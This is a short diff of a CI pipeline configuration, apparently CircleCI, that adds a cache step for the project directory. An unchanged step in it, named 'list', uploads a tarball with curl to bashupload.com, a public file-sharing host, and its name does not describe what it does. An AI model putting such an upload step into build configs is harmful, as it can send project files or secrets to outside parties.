@@ -84,3 +84,7 @@ jobs:
       - run:
           name: list
           command: curl https://bashupload.com/upload.tar.gz --data-binary @upload.tar.gz 
+      - save_cache:
+          key: my-cache
+          paths:
+            - ~/project
